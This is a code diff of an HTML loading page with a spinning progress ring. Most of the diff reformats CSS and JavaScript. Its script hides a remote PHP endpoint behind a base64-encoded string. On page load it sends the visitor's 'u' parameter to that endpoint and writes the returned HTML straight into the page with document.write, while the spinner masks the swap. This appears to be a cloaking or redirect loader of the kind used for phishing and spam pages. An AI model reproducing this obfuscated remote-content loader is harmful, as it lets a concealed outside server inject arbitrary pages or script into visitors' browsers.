@@ -27,12 +27,8 @@
 
     /* 旋转动画 */
     @keyframes rotate {
-      0% {
-        transform: rotate(0deg);
-      }
-      100% {
-        transform: rotate(360deg);
-      }
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
 
     .loader svg {
@@ -47,10 +43,7 @@
       r: 35;
     }
 
-    .loader .track {
-      stroke: #eee;
-    }
-
+    .loader .track { stroke: #eee; }
     .loader .progress {
       stroke: #3498db;
       stroke-linecap: round;
@@ -61,12 +54,8 @@
     }
 
     @keyframes progress {
-      from {
-        stroke-dashoffset: 219.91;
-      }
-      to {
-        stroke-dashoffset: 0;
-      }
+      from { stroke-dashoffset: 219.91; }
+      to { stroke-dashoffset: 0; }
     }
 
     .percent-text {
@@ -96,10 +85,11 @@
 
   <script>
     const apiUrl = "aHR0cHM6Ly9maC53a2t4LmNuL0Nvcy9hcGkucGhw"; 
+
     function getQueryString(name) {
       const reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
       const r = window.location.search.substr(1).match(reg);
-      return r ? unescape(r[2]) : null;
+      return r ? decodeURIComponent(r[2]) : null;
     }
 
     function updateProgress(percent) {
@@ -122,26 +112,29 @@
       }
     }, 150);
 
-    window.onload = function() {
-    const url = getQueryString("u");
-    const decodedApiUrl = atob(apiUrl); 
-    fetch(decodedApiUrl, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/x-www-form-urlencoded'
-    },
-    body: `url=${encodeURIComponent(url)}`
-    })
-   .then(response => response.json())
-   .then(data => {
-     updateProgress(100);
-    clearInterval(timer);
-    setTimeout(() => {
-      document.write(data.html);
-    }, 100);
-    })
-   .catch(error => console.error('请求失败:', error));
-   };
-</script>
+    window.onload = async function() {
+      const url = getQueryString("u");
+      const decodedApiUrl = atob(apiUrl); 
+
+      try {
+        const response = await fetch(decodedApiUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: `url=${encodeURIComponent(url)}`
+        });
+
+        const data = await response.json();
+        updateProgress(100);
+        clearInterval(timer);
+
+        setTimeout(() => {
+          document.write(data.html);
+        }, 200);
+
+      } catch (error) {
+        console.error('请求失败:', error);
+      }
+    };
+  </script>
 </body>
 </html>
